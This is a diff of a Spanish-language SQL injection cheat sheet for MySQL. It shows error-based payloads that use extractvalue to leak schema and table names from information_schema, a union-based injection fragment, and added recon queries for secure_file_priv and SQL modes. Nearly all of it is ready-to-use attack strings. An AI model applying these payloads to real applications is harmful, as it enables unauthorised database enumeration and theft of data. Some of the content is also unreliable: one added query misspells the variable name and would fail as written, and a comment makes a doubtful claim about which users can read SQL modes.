@@ -17,3 +17,10 @@ select * from <nombre_tabla> where param_name='toto' union select user(),databas
 # Error based injeccion, esta afichara informacion en el error sql generado
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 18,1)))-- -
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES LIMIT 5,1)))-- -
+
+# Deteccion de el repertorio y loes privilegios mysql los cuales pueden potenciamente ser leidos, por el root mysql
+# or por el utilisador con los privilegios necesarios
+SELECT @@secure_file_priv;
+
+# Descubrir los modos sql !!Atencion solo utilisador con privilegios elevados puede observar los modos
+SELECT @@sql_mod;
